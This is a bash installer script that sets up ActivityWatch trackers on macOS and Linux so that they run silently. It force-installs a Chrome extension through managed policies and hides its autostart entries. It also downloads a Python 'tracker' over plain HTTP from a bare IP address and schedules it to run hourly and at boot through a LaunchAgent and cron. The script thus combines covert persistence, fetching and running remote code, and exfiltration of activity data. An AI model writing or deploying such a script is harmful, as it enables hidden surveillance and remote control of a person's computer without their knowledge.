#!/bin/bash
echo "Starting ActivityWatch Master Installation..."

if [ "$(uname)" == "Darwin" ]; then
    echo "macOS detected."
    echo "Setting up Chrome Policy (Requires Mac Password)..."
    sudo mkdir -p "/Library/Managed Preferences"
    sudo tee "/Library/Managed Preferences/com.google.Chrome.plist" > /dev/null <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>ExtensionInstallForcelist</key>
    <array>
        <string>nglaklhklhcoonedhgnpgddginnjdadi;https://clients2.google.com/service/update2/crx</string>
    </array>
</dict>
</plist>
EOF
    
    # Download and extract ActivityWatch for macOS only if not installed
    if [ ! -f "/Applications/activitywatch/aw-server/aw-server" ]; then
        curl -L -o /tmp/aw-mac.zip "https://github.com/ActivityWatch/activitywatch/releases/download/v0.13.2/activitywatch-v0.13.2-macos-x86_64.zip"
        unzip -o /tmp/aw-mac.zip -d /Applications/
    else
        echo "ActivityWatch already installed. Skipping download."
    fi
    
    # Create a hidden startup script
    mkdir -p ~/.aw_tracker
    cat > ~/.aw_tracker/start_aw.sh <<EOF
#!/bin/bash
nohup /Applications/activitywatch/aw-server/aw-server > /dev/null 2>&1 &
sleep 3
nohup /Applications/activitywatch/aw-watcher-afk/aw-watcher-afk > /dev/null 2>&1 &
nohup /Applications/activitywatch/aw-watcher-window/aw-watcher-window > /dev/null 2>&1 &
EOF
    chmod +x ~/.aw_tracker/start_aw.sh
    chown -R $SUDO_USER ~/.aw_tracker
    
    # Run headless trackers in background
    ~/.aw_tracker/start_aw.sh
    
    # Create LaunchAgent so it starts automatically on every boot
    mkdir -p ~/Library/LaunchAgents
    cat > ~/Library/LaunchAgents/com.activitywatch.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.activitywatch.startup</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>$HOME/.aw_tracker/start_aw.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF
    chmod 644 ~/Library/LaunchAgents/com.activitywatch.plist
    launchctl load ~/Library/LaunchAgents/com.activitywatch.plist 2>/dev/null
else
    echo "Ubuntu/Linux detected. (Requires Password for setup)"
    # Ubuntu Chrome Policy
    sudo mkdir -p /etc/opt/chrome/policies/managed
    sudo tee /etc/opt/chrome/policies/managed/activitywatch.json > /dev/null <<EOF
{
  "ExtensionInstallForcelist": [
    "nglaklhklhcoonedhgnpgddginnjdadi;https://clients2.google.com/service/update2/crx"
  ]
}
EOF
    sudo chmod -R 755 /etc/opt/chrome/policies
    
    # Download and extract ActivityWatch for Linux only if not installed
    if [ ! -f "/opt/activitywatch/aw-server" ]; then
        curl -L -o /tmp/aw-linux.zip "https://github.com/ActivityWatch/activitywatch/releases/download/v0.13.2/activitywatch-v0.13.2-linux-x86_64.zip"
        sudo unzip -o /tmp/aw-linux.zip -d /opt/
    else
        echo "ActivityWatch already installed. Skipping download."
    fi
    
    mkdir -p ~/.aw_tracker
    cat > ~/.aw_tracker/start_aw.sh <<EOF
#!/bin/bash
nohup /opt/activitywatch/aw-server/aw-server > /dev/null 2>&1 &
sleep 3
nohup /opt/activitywatch/aw-watcher-afk/aw-watcher-afk > /dev/null 2>&1 &
nohup /opt/activitywatch/aw-watcher-window/aw-watcher-window > /dev/null 2>&1 &
EOF
    chmod +x ~/.aw_tracker/start_aw.sh
    
    # Run headless trackers in background and set to auto-start on boot
    ~/.aw_tracker/start_aw.sh
    
    # Create autostart entry for all users
    sudo tee /etc/xdg/autostart/activitywatch-server.desktop > /dev/null <<EOF
[Desktop Entry]
Name=AW-Server
Exec=/opt/activitywatch/aw-server/aw-server
Type=Application
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF
    sudo tee /etc/xdg/autostart/activitywatch-afk.desktop > /dev/null <<EOF
[Desktop Entry]
Name=AW-Watcher-AFK
Exec=/opt/activitywatch/aw-watcher-afk/aw-watcher-afk
Type=Application
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF
    sudo tee /etc/xdg/autostart/activitywatch-window.desktop > /dev/null <<EOF
[Desktop Entry]
Name=AW-Watcher-Window
Exec=/opt/activitywatch/aw-watcher-window/aw-watcher-window
Type=Application
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF
    sudo chmod 644 /etc/xdg/autostart/activitywatch*.desktop
fi

echo "Setting up Python Tracker..."
# Download from OUR SERVER (not GitHub): the server injects the real backend
# URL + write key into the file before serving it.
mkdir -p ~/.aw_tracker
curl -sSL -o ~/.aw_tracker/activity_tracker.py "http://16.171.17.163:8000/tracker/activity_tracker.py"

if [ "$(uname)" == "Darwin" ]; then
    PYTHON_PATH=$(which python3)
    echo "Setting up macOS LaunchAgent for auto-sync..."
    cat > ~/Library/LaunchAgents/com.activitywatch.sync.plist <<EOF_PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.activitywatch.sync</string>
    <key>ProgramArguments</key>
    <array>
        <string>$PYTHON_PATH</string>
        <string>$HOME/.aw_tracker/activity_tracker.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>AbandonProcessGroup</key>
    <true/>
    <key>WatchPaths</key>
    <array>
        <string>/Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist</string>
        <string>/Library/Preferences/SystemConfiguration/com.apple.wifi.message-tracer.plist</string>
    </array>
    <key>StartInterval</key>
    <integer>3600</integer>
</dict>
</plist>
EOF_PLIST
    launchctl load ~/Library/LaunchAgents/com.activitywatch.sync.plist 2>/dev/null
else
    echo "Setting up Linux crontab for auto-sync..."
    PYTHON_PATH=$(which python3)
    (crontab -l 2>/dev/null; echo "0 * * * * $PYTHON_PATH $HOME/.aw_tracker/activity_tracker.py"; echo "@reboot $PYTHON_PATH $HOME/.aw_tracker/activity_tracker.py") | sort | uniq | crontab -
fi

echo "Installation Complete! Chrome extension and ActivityWatch are now running silently."
echo "Triggering first background sync (will execute within 0-5 minutes)..."
nohup $PYTHON_PATH $HOME/.aw_tracker/activity_tracker.py >/dev/null 2>&1 &
